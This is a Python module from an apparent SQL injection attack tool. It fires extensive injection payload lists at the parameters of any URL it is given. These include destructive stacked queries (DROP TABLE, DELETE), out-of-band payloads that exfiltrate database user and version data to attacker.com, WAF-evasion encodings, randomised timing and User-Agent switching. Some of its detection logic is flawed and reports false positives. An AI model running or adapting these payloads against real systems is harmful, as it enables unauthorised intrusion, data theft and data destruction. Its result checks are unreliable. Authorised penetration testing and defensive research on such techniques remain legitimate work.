#!/usr/bin/env python3
"""
SQL injection tester module for SQLMaster
"""

import json
import time
import random
import string
import warnings
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, parse_qsl, quote
import requests
from rich.console import Console
from rich.progress import Progress

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

class SQLTester:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': config['general']['user_agent'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })
        self.timeout = config['general']['timeout']
        self.payloads = self.load_payloads()
        # Track WAF detection
        self.waf_detected = False
        self.waf_type = None
        # SPA detection sensitivity - make it less aggressive
        self.spa_detection_enabled = config.get('detection', {}).get('spa_detection', False)  # Disabled by default
        self.php_detected = False
       
    def load_payloads(self):
        """Load or create default payloads with WAF bypass techniques"""
        payloads = {
            'error_based': [
                # Basic payloads
                "'",
                "''",
                "`",
                "\"",
                # Classic SQLi with comments
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "' OR '1'='1' /*",
                "') OR ('1'='1",
                # WAF bypass variations
                "' OR '1'='1'-- -",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "' OR 'a'='a",
                "' OR 'a'='a'--",
                "' OR 'a'='a'#",
                "' OR 'a'='a'/*",
                "\" OR \"\"=\"",
                "\" OR 1=1--",
                "\" OR 1=1#",
                "\" OR 1=1/*",
                # Union payloads
                "' OR 1=1 UNION SELECT NULL--",
                "' OR 1=1 UNION SELECT NULL, NULL--",
                "' OR 1=1 UNION SELECT NULL, NULL, NULL--",
                # Advanced payloads
                "1' ORDER BY 1--",
                "1' ORDER BY 1000--",
                "' GROUP BY columnnames having 1=1 --",
                "-1' UNION SELECT 1,2,3--",
                "-1' UNION SELECT 1,@@version,3--",
                "' AND 1=0 UNION SELECT 1,2,3--",
                # Time-based for error detection
                "' OR IF(1=1, SLEEP(2), 0)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(2)))a)--",
                # WAF bypass payloads
                "'%20OR%20'1'%3D'1",
                "'/**/OR/**/'1'/**/='1",
                "'%0AOR%0A'1'='1",
                "'%09OR%09'1'='1",
                "'%0DOR%0D'1'='1",
                "'%0COR%0C'1'='1",
                "'%0BOR%0B'1'='1",
                "'%a0OR%a0'1'='1",
                # Case variation
                "' Or '1'='1",
                "' oR '1'='1",
                "' or '1'='1",
                # Double encoding
                "%2527%2520OR%2520%25271%2527%253D%25271",
                # Unicode bypass
                "'%u0020OR%u0020'1'='1",
                "'%u00A0OR%u00A0'1'='1",
            ],
            'union_based': [
                # Basic union tests
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL, NULL--",
                "' UNION SELECT NULL, NULL, NULL--",
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4--",
                "' UNION SELECT 1,2,3,4,5--",
                # Function tests
                "1' UNION SELECT database()--",
                "1' UNION SELECT user()--",
                "1' UNION SELECT version()--",
                "1' UNION SELECT @@version--",
                "1' UNION SELECT table_name FROM information_schema.tables--",
                "1' UNION SELECT column_name FROM information_schema.columns--",
                # WAF bypass union
                "'/**/UNION/**/SELECT/**/NULL--",
                "'%0AUNION%0ASELECT%0ANULL--",
                "'%09UNION%09SELECT%09NULL--",
                "'%0DUNION%0DSELECT%0DNULL--",
                "'%0CUNION%0CSELECT%0CNULL--",
                # Case variation
                "' union select null--",
                "' Union Select null--",
                "' uNiOn SeLeCt null--",
                # Comment variation
                "' UNION SELECT NULL#",
                "' UNION SELECT NULL/*",
                "' UNION SELECT NULL-- -",
            ],
            'boolean_blind': [
                # Basic boolean
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND '1'='1",
                "' AND '1'='2",
                # Advanced boolean
                "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                "' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))=53--",
                "' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))>53--",
                "' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))<53--",
                # WAF bypass boolean
                "'%20AND%201=1--",
                "'/**/AND/**/1=1--",
                "'%0AAND%0A1=1--",
                "'%09AND%091=1--",
            ],
            'time_based': [
                # Basic time delays
                "' OR SLEEP(2)--",
                "' OR BENCHMARK(1000000,MD5('A'))--",
                "' OR pg_sleep(2)--",
                "'; WAITFOR DELAY '00:00:02'--",
                "' OR (SELECT * FROM (SELECT(SLEEP(2)))a)--",
                "' XOR (SELECT * FROM (SELECT(SLEEP(2)))a)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
                # Conditional time delays
                "' OR (SELECT COUNT(*) FROM information_schema.tables)>=0 AND SLEEP(2)--",
                "' OR (SELECT COUNT(*) FROM information_schema.columns)>=0 AND SLEEP(2)--",
                # WAF bypass time-based
                "'/**/OR/**/SLEEP(2)--",
                "'%20OR%20SLEEP(2)--",
                "'%0AOR%0ASLEEP(2)--",
                "'%09OR%09SLEEP(2)--",
                # Shorter delay for testing
                "' OR SLEEP(1)--",
                "' OR pg_sleep(1)--",
            ],
            'stacked_queries': [
                "'; SELECT 1--",
                "'; SELECT 1,2--",
                "'; SELECT 1,2,3--",
                "'; DROP TABLE IF EXISTS test--",
                "'; CREATE TABLE test (id INT)--",
                "'; INSERT INTO test VALUES (1)--",
                "'; UPDATE test SET id=2 WHERE id=1--",
                "'; DELETE FROM test WHERE id=1--",
                # WAF bypass
                "'%3B%20SELECT%201--",
                "'/**/;/**/SELECT/**/1--",
            ],
            'out_of_band': [
                "' || utl_http.request('http://attacker.com/'||(SELECT user FROM dual))--",
                "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
                "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\test.txt'))--",
                # DNS exfiltration
                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.attacker.com\\\\test'))--",
            ]
        }
        return payloads
    
    def detect_technology(self, url):
        """Detect server technology - helps with SPA vs traditional distinction"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            headers = response.headers
            content = response.text.lower()
            
            # Check for PHP
            php_indicators = [
                '.php',
                'php/',
                'x-powered-by: php',
                'phpsessid',
                '<?php',
                'session_start()',
                'mysql_connect',
                'mysqli_',
                'pdo'
            ]
            
            for indicator in php_indicators:
                if indicator in url.lower() or indicator in str(headers).lower() or indicator in content:
                    self.php_detected = True
                    return "PHP"
            
            # Check for ASP.NET
            asp_indicators = [
                '.aspx',
                '.asp',
                'asp.net',
                'x-aspnet-version',
                '__viewstate',
                '__eventvalidation'
            ]
            
            for indicator in asp_indicators:
                if indicator in url.lower() or indicator in str(headers).lower() or indicator in content:
                    return "ASP.NET"
            
            # Check for JSP
            jsp_indicators = [
                '.jsp',
                'jsessionid',
                'java'
            ]
            
            for indicator in jsp_indicators:
                if indicator in url.lower() or indicator in str(headers).lower() or indicator in content:
                    return "JSP"
            
            return "Unknown"
            
        except Exception as e:
            return "Unknown"
    
    def detect_waf(self, url):
        """Detect if a WAF is present - but don't stop testing"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            headers = response.headers
            
            # Check for Cloudflare
            if 'server' in headers and 'cloudflare' in headers['server'].lower():
                self.waf_detected = True
                self.waf_type = 'Cloudflare'
                console.print(f"[yellow][!] Cloudflare WAF detected[/yellow]")
                return 'Cloudflare'
            
            # Check for other WAFs
            waf_indicators = {
                'cloudflare': ['cf-ray', '__cfduid', 'cf-cache-status', 'cf-request-id'],
                'akamai': ['akamai', 'x-akamai'],
                'imperva': ['incap_ses_', 'visid_incap_'],
                'sucuri': ['x-sucuri-id', 'x-sucuri-cache'],
                'aws_waf': ['x-amz-id-2', 'x-amz-request-id'],
                'mod_security': ['mod_security', 'owasp_crs']
            }
            
            for waf, indicators in waf_indicators.items():
                for indicator in indicators:
                    for header_name in headers:
                        if indicator in header_name.lower():
                            self.waf_detected = True
                            self.waf_type = waf
                            console.print(f"[yellow][!] {waf.upper()} WAF detected[/yellow]")
                            return waf
            
            return None
            
        except Exception as e:
            return None
    
    def is_spa_response(self, response_text, url):
        """Check if response is from a Single Page Application - MUCH MORE CONSERVATIVE"""
        if not self.spa_detection_enabled:
            return False
            
        # If we detect PHP, it's definitely not an SPA
        if self.php_detected:
            return False
            
        # Check URL for traditional server-side extensions
        traditional_extensions = ['.php', '.asp', '.aspx', '.jsp', '.cfm', '.pl', '.cgi', '.py']
        for ext in traditional_extensions:
            if ext in url.lower():
                return False
        
        spa_indicators = [
            # Strong SPA indicators
            '<div id="root"></div>',
            '<div id="app"></div>',
            '<div id="__nuxt"></div>',
            '<div id="__next"></div>',
            # Very specific framework indicators
            '__NEXT_DATA__ =',
            'window.__NUXT__',
            'react-dom.production.min.js',
            'vue.runtime.esm-browser.prod.js',
            'angular.min.js',
            # SPA frameworks in script tags
            '<script src="/_next/',
            '<script src="/nuxt/',
            # No server-side content at all
            '<body><div id="app">',
            '<body><div id="root">',
        ]
       
        response_lower = response_text.lower()
        
        # Count STRONG matches only
        strong_match_count = 0
        for indicator in spa_indicators:
            if indicator.lower() in response_lower:
                strong_match_count += 1
        
        # Only consider it SPA if we have VERY strong evidence
        if strong_match_count >= 3:
            console.print(f"[yellow][*] SPA-like content detected (strong indicators: {strong_match_count})[/yellow]")
            return True
            
        # Check for absence of traditional content
        traditional_indicators = [
            '<form',
            '<input type="submit"',
            'method="post"',
            'method="get"',
            '.php?',
            'action="',
            '<!--',
            '<table',
            '<tr>',
            '<td>'
        ]
        
        traditional_count = 0
        for indicator in traditional_indicators:
            if indicator.lower() in response_lower:
                traditional_count += 1
        
        # If it has lots of traditional indicators, it's not an SPA
        if traditional_count >= 3:
            return False
            
        # Also check for common SPA patterns with regex
        import re
        spa_patterns = [
            r'<script[^>]*src="[^"]*\/_next\/static\/[^"]*"',
            r'<script[^>]*src="[^"]*\/nuxt\/[^"]*"',
            r'<script[^>]*src="[^"]*\/react\/[^"]*\.js"',
            r'<script[^>]*src="[^"]*\/vue\/[^"]*\.js"',
            r'<script[^>]*src="[^"]*\/angular\/[^"]*\.js"',
        ]
        
        strong_matches = 0
        for pattern in spa_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                strong_matches += 1
                
        if strong_matches >= 2:
            console.print(f"[yellow][*] Strong SPA framework indicators detected[/yellow]")
            return True
            
        return False
    
    def get_baseline_response(self, url):
        """Get baseline response without any injection payloads"""
        try:
            # Detect technology first
            tech = self.detect_technology(url)
            if tech == "PHP":
                self.php_detected = True
                console.print(f"[cyan][*] PHP detected - traditional web application[/cyan]")
            
            # Check for WAF but don't stop if found
            self.detect_waf(url)
            
            response = self.session.get(url, timeout=self.timeout, verify=False)
            return response.text
        except Exception as e:
            console.print(f"[yellow][!] Error getting baseline: {str(e)}[/yellow]")
            return ""
    
    def is_cloudflare_challenge(self, response_text):
        """Check if Cloudflare challenge page is shown"""
        cloudflare_indicators = [
            'cf-error-details',
            'cf-browser-verification',
            'challenge',
            'ray id',
            'performance & security by cloudflare',
            'checking your browser'
        ]
        
        response_lower = response_text.lower()
        for indicator in cloudflare_indicators:
            if indicator in response_lower:
                console.print(f"[yellow][!] Cloudflare challenge detected, trying bypass...[/yellow]")
                return True
        return False
    
    def apply_waf_bypass(self, payload):
        """Apply WAF bypass techniques to payloads"""
        if not self.waf_detected:
            return payload
            
        # Don't modify all payloads, just occasionally to avoid detection
        if random.random() < 0.3:  # 30% chance to apply bypass
            bypass_techniques = [
                # Add comments
                lambda p: p.replace(' ', '/**/'),
                lambda p: p.replace(' ', '%0A'),
                lambda p: p.replace(' ', '%09'),
                lambda p: p.replace(' ', '%0D'),
                # Case variation
                lambda p: ''.join(c.lower() if random.random() < 0.5 else c.upper() for c in p),
                # URL encode
                lambda p: quote(p, safe=''),
            ]
            
            technique = random.choice(bypass_techniques)
            try:
                return technique(payload)
            except:
                pass
                
        return payload
    
    def test_error_based(self, url, progress_callback):
        """Test for error-based SQL injection"""
        results = []
       
        try:
            # Get baseline but don't stop if SPA detected
            baseline_response = self.get_baseline_response(url)
            
            # Check for SPA but don't stop testing - just log it
            spa_detected = self.is_spa_response(baseline_response, url)
            if spa_detected and self.php_detected:
                console.print(f"[cyan][*] Mixed content detected - continuing tests...[/cyan]")
            elif spa_detected:
                console.print(f"[yellow][*] SPA content detected but continuing tests anyway...[/yellow]")

            parsed = urlparse(url)
            # Use parse_qsl to preserve single parameter with multiple values
            params = parse_qsl(parsed.query, keep_blank_values=True)
           
            if not params:
                return results
           
            total_tests = len(params) * len(self.payloads['error_based'])
            tests_completed = 0
           
            for param, original_value in params:
                for payload in self.payloads['error_based']:
                    tests_completed += 1
                    progress = int((tests_completed / total_tests) * 100)
                    if callable(progress_callback):
                        progress_callback(progress)
                    
                    # Apply WAF bypass if needed
                    test_payload = self.apply_waf_bypass(payload)
                    
                    # Build query string properly with URL encoding
                    query_parts = []
                    for p, v in params:
                        if p == param:
                            # Properly encode the payload
                            query_parts.append(f"{p}={quote(test_payload, safe='')}")
                        else:
                            query_parts.append(f"{p}={quote(v, safe='')}")
                   
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(query_parts)}"
                   
                    try:
                        # Random delay to avoid rate limiting
                        time.sleep(random.uniform(0.1, 0.3))
                        
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                        
                        # Check for Cloudflare challenge
                        if self.is_cloudflare_challenge(response.text):
                            # Try with different User-Agent
                            old_ua = self.session.headers['User-Agent']
                            self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                            continue
                       
                        if self.detect_sql_errors(response.text):
                            error_msg = self.extract_db_error(response.text)
                           
                            # Check for duplicates
                            is_duplicate = False
                            for existing in results:
                                if (existing['parameter'] == param and
                                    existing['payload'] == payload and
                                    'db_error' in existing and error_msg and
                                    existing['db_error'][:50] == error_msg[:50]):
                                    is_duplicate = True
                                    break
                           
                            if not is_duplicate:
                                results.append({
                                    'type': 'Error-based SQL Injection',
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'db_error': error_msg[:200] if error_msg else 'Error detected',
                                    'confidence': 'High',
                                    'status_code': response.status_code,
                                    'response_time': response.elapsed.total_seconds()
                                })
                                console.print(f"[green][+] Error-based SQLi found: {param} = {payload[:30]}...[/green]")
                    
                    except requests.RequestException as e:
                        # Don't print every error, just continue
                        continue
           
        except Exception as e:
            console.print(f"[yellow][!] Error in test_error_based: {str(e)}[/yellow]")
       
        return results
   
    def test_union_based(self, url, progress_callback):
        """Test for union-based SQL injection - NEVER STOP ON SPA DETECTION"""
        results = []
       
        try:
            parsed = urlparse(url)
            params = parse_qsl(parsed.query, keep_blank_values=True)
           
            if not params:
                return results
           
            total_tests = len(params) * 8  # Test up to 8 columns with variations
            tests_completed = 0
           
            for param, original_value in params:
                # First, find number of columns with different techniques
                for columns in range(1, 9):
                    tests_completed += 1
                    progress = int((tests_completed / total_tests) * 100)
                    if callable(progress_callback):
                        progress_callback(progress)
                    
                    # Try different NULL payload variations
                    null_variations = [
                        "NULL",
                        "null",
                        "Null",
                        "1",
                        "'a'",
                        "@@version",
                        "database()"
                    ]
                    
                    for null_type in null_variations[:3]:  # Try first 3 variations
                        payload = f"' UNION SELECT " + ",".join([null_type] * columns) + "--"
                        
                        # Apply WAF bypass
                        test_payload = self.apply_waf_bypass(payload)
                       
                        # Build query string properly
                        query_parts = []
                        for p, v in params:
                            if p == param:
                                query_parts.append(f"{p}={quote(test_payload, safe='')}")
                            else:
                                query_parts.append(f"{p}={quote(v, safe='')}")
                       
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(query_parts)}"
                       
                        try:
                            # Random delay
                            time.sleep(random.uniform(0.1, 0.3))
                            
                            response = self.session.get(test_url, timeout=self.timeout, verify=False)
                           
                            # Check for successful union (no error, different content)
                            if response.status_code == 200 and not self.detect_sql_errors(response.text):
                                # Test with actual values
                                value_payload = f"' UNION SELECT " + ",".join([str(i) for i in range(1, columns+1)]) + "--"
                               
                                query_parts2 = []
                                for p, v in params:
                                    if p == param:
                                        query_parts2.append(f"{p}={quote(value_payload, safe='')}")
                                    else:
                                        query_parts2.append(f"{p}={quote(v, safe='')}")
                               
                                test_url2 = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(query_parts2)}"
                                
                                # Random delay
                                time.sleep(random.uniform(0.1, 0.3))
                                
                                response2 = self.session.get(test_url2, timeout=self.timeout, verify=False)
                               
                                if response2.status_code == 200:
                                    results.append({
                                        'type': 'Union-based SQL Injection',
                                        'url': test_url2,
                                        'parameter': param,
                                        'payload': value_payload,
                                        'columns': columns,
                                        'confidence': 'High',
                                        'status_code': response2.status_code
                                    })
                                    console.print(f"[green][+] Union-based SQLi found: {columns} columns[/green]")
                                    break  # Stop testing this parameter
                       
                        except requests.RequestException:
                            continue
                    
                    if results and any(r['parameter'] == param for r in results):
                        break  # Move to next parameter
       
        except Exception as e:
            console.print(f"[yellow][!] Error in test_union_based: {str(e)}[/yellow]")
       
        return results

    def test_boolean_blind(self, url, progress_callback):
        """Test for boolean-based blind SQL injection"""
        results = []
       
        try:
            parsed = urlparse(url)
            params = parse_qsl(parsed.query, keep_blank_values=True)
           
            if not params:
                return results
           
            total_tests = len(params) * 4  # Multiple test variations
            tests_completed = 0
           
            for param, original_value in params:
                # Test different boolean payload variations
                test_pairs = [
                    ("' AND '1'='1'--", "' AND '1'='2'--"),
                    ("' AND 1=1--", "' AND 1=2--"),
                    ("'%20AND%20'1'='1'--", "'%20AND%20'1'='2'--"),
                    ("'/**/AND/**/'1'='1'--", "'/**/AND/**/'1'='2'--"),
                ]
                
                for true_payload, false_payload in test_pairs:
                    tests_completed += 1
                    progress = int((tests_completed / total_tests) * 100)
                    if callable(progress_callback):
                        progress_callback(progress)
                   
                    # Apply WAF bypass
                    true_payload = self.apply_waf_bypass(true_payload)
                    false_payload = self.apply_waf_bypass(false_payload)
                   
                    query_parts_true = []
                    query_parts_false = []
                    for p, v in params:
                        if p == param:
                            query_parts_true.append(f"{p}={quote(true_payload, safe='')}")
                            query_parts_false.append(f"{p}={quote(false_payload, safe='')}")
                        else:
                            query_parts_true.append(f"{p}={quote(v, safe='')}")
                            query_parts_false.append(f"{p}={quote(v, safe='')}")
                   
                    true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(query_parts_true)}"
                    false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(query_parts_false)}"
                   
                    try:
                        # Random delays
                        time.sleep(random.uniform(0.2, 0.8))
                        true_response = self.session.get(true_url, timeout=self.timeout, verify=False)
                        
                        time.sleep(random.uniform(0.2, 0.8))
                        false_response = self.session.get(false_url, timeout=self.timeout, verify=False)
                       
                        # Compare responses
                        if true_response.status_code == 200 and false_response.status_code == 200:
                            # Check for content differences
                            true_len = len(true_response.text)
                            false_len = len(false_response.text)
                            true_words = len(true_response.text.split())
                            false_words = len(false_response.text.split())
                           
                            # Multiple indicators
                            length_diff = abs(true_len - false_len)
                            word_diff = abs(true_words - false_words)
                           
                            if length_diff > 50 or word_diff > 10:
                                results.append({
                                    'type': 'Boolean-based Blind SQL Injection',
                                    'url': url,
                                    'parameter': param,
                                    'true_response_len': true_len,
                                    'false_response_len': false_len,
                                    'confidence': 'Medium',
                                    'technique': 'Content comparison'
                                })
                                console.print(f"[green][+] Boolean blind SQLi detected: {param}[/green]")
                                break  # Stop testing this parameter
               
                    except requests.RequestException:
                        continue
                
                if results and any(r['parameter'] == param for r in results):
                    break  # Move to next parameter
       
        except Exception as e:
            console.print(f"[yellow][!] Error in test_boolean_blind: {str(e)}[/yellow]")
       
        return results
   
    def test_time_based(self, url, progress_callback):
        """Test for time-based blind SQL injection"""
        results = []
       
        try:
            parsed = urlparse(url)
            params = parse_qsl(parsed.query, keep_blank_values=True)
           
            if not params:
                return results
           
            total_tests = len(params) * 5  # Test 5 different time-based payloads
            tests_completed = 0
           
            for param, original_value in params:
                for payload in self.payloads['time_based'][:5]:  # Test first 5
                    tests_completed += 1
                    progress = int((tests_completed / total_tests) * 100)
                    if callable(progress_callback):
                        progress_callback(progress)
                    
                    # Apply WAF bypass
                    test_payload = self.apply_waf_bypass(payload)
                   
                    # Build query string properly
                    query_parts = []
                    for p, v in params:
                        if p == param:
                            query_parts.append(f"{p}={quote(test_payload, safe='')}")
                        else:
                            query_parts.append(f"{p}={quote(v, safe='')}")
                   
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(query_parts)}"
                   
                    try:
                        # Get baseline time first
                        baseline_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join([f'{p}={quote(v, safe="")}' for p, v in params])}"
                        start_baseline = time.time()
                        baseline_response = self.session.get(baseline_url, timeout=5, verify=False)
                        end_baseline = time.time()
                        baseline_time = end_baseline - start_baseline
                        
                        # Test payload
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=10, verify=False)
                        end_time = time.time()
                       
                        response_time = end_time - start_time
                        
                        # Check if significantly slower than baseline
                        if response_time > baseline_time + 1.5:  # 1.5 seconds slower
                            results.append({
                                'type': 'Time-based Blind SQL Injection',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'delay': round(response_time, 2),
                                'baseline_delay': round(baseline_time, 2),
                                'confidence': 'High' if response_time > baseline_time + 3 else 'Medium',
                                'status_code': response.status_code
                            })
                            console.print(f"[green][+] Time-based SQLi found: {response_time:.2f}s delay[/green]")
                            break  # Stop testing this parameter
                   
                    except requests.Timeout:
                        results.append({
                            'type': 'Time-based Blind SQL Injection',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'delay': 'Timeout (>10s)',
                            'confidence': 'High',
                            'status_code': 'Timeout'
                        })
                        console.print(f"[green][+] Time-based SQLi (timeout)[/green]")
                        break
                   
                    except requests.RequestException:
                        continue
                
                if results and any(r['parameter'] == param for r in results):
                    break  # Move to next parameter
       
        except Exception as e:
            console.print(f"[yellow][!] Error in test_time_based: {str(e)}[/yellow]")
       
        return results
   
    def test_stacked_queries(self, url, progress_callback):
        """Test for stacked queries SQL injection"""
        results = []
       
        try:
            parsed = urlparse(url)
            params = parse_qsl(parsed.query, keep_blank_values=True)
           
            if not params:
                return results
           
            total_tests = len(params) * len(self.payloads['stacked_queries'])
            tests_completed = 0
           
            for param, original_value in params:
                for payload in self.payloads['stacked_queries']:
                    tests_completed += 1
                    progress = int((tests_completed / total_tests) * 100)
                    if callable(progress_callback):
                        progress_callback(progress)
                    
                    # Apply WAF bypass
                    test_payload = self.apply_waf_bypass(payload)
                   
                    # Build query string properly
                    query_parts = []
                    for p, v in params:
                        if p == param:
                            query_parts.append(f"{p}={quote(test_payload, safe='')}")
                        else:
                            query_parts.append(f"{p}={quote(v, safe='')}")
                   
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(query_parts)}"
                   
                    try:
                        time.sleep(random.uniform(0.2, 0.5))
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                       
                        # Check for different response or errors
                        if response.status_code == 200:
                            # Stacked queries might not show immediate errors
                            # We'll flag if it returns successfully with stacked payload
                            if ';' in payload:
                                results.append({
                                    'type': 'Stacked Queries SQL Injection',
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'confidence': 'Low',  # Harder to confirm
                                    'status_code': response.status_code
                                })
                                console.print(f"[yellow][*] Stacked queries tested: {param}[/yellow]")
                   
                    except requests.RequestException:
                        continue
       
        except Exception as e:
            console.print(f"[yellow][!] Error in test_stacked_queries: {str(e)}[/yellow]")
       
        return results
   
    def test_out_of_band(self, url, progress_callback):
        """Test for out-of-band SQL injection"""
        results = []
       
        try:
            parsed = urlparse(url)
            params = parse_qsl(parsed.query, keep_blank_values=True)
           
            if not params:
                return results
           
            total_tests = len(params) * len(self.payloads['out_of_band'])
            tests_completed = 0
           
            for param, original_value in params:
                for payload in self.payloads['out_of_band']:
                    tests_completed += 1
                    progress = int((tests_completed / total_tests) * 100)
                    if callable(progress_callback):
                        progress_callback(progress)
                    
                    # Apply WAF bypass
                    test_payload = self.apply_waf_bypass(payload)
                   
                    # Build query string properly
                    query_parts = []
                    for p, v in params:
                        if p == param:
                            query_parts.append(f"{p}={quote(test_payload, safe='')}")
                        else:
                            query_parts.append(f"{p}={quote(v, safe='')}")
                   
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(query_parts)}"
                   
                    try:
                        time.sleep(random.uniform(0.2, 0.5))
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                       
                        # Out-of-band is hard to detect without actual callback
                        # We'll just note the attempt
                        if response.status_code == 200:
                            results.append({
                                'type': 'Out-of-band SQL Injection Attempt',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'confidence': 'Low',  # Cannot confirm without callback
                                'status_code': response.status_code,
                                'note': 'Out-of-band requires external callback server'
                            })
                            console.print(f"[yellow][*] Out-of-band payload tested: {param}[/yellow]")
                   
                    except requests.RequestException:
                        continue
       
        except Exception as e:
            console.print(f"[yellow][!] Error in test_out_of_band: {str(e)}[/yellow]")
       
        return results
   
    def detect_sql_errors(self, response_text):
        """Detect SQL error messages in response"""
        error_patterns = [
            'SQL syntax',
            'MySQL',
            'PostgreSQL',
            'ORA-[0-9]',
            'Microsoft.*ODBC',
            'Driver.*SQL',
            'SQLServer.*Driver',
            'Warning.*mysql',
            'Unclosed quotation mark',
            'You have an error in your SQL syntax',
            'Unknown column',
            'Table.*doesn\'t exist',
            'mysqli',
            'sqlite',
            'SQLite/JDBCDriver',
            'PostgreSQL.*ERROR',
            'Warning.*pg_',
            'PSQLException',
            'SQLSTATE'
        ]
       
        response_lower = response_text.lower()
        for pattern in error_patterns:
            if pattern.lower() in response_lower:
                return True
        return False
   
    def extract_db_error(self, response_text):
        """Extract database error from response"""
        import re
       
        error_patterns = [
            r'SQL.*error[^<]*',
            r'mysql.*error[^<]*',
            r'postgresql.*error[^<]*',
            r'ORA-\d+[^<]*',
            r'error.*sql[^<]*',
            r'syntax.*error[^<]*'
        ]
       
        for pattern in error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)[:200]
       
        return "SQL error detected"
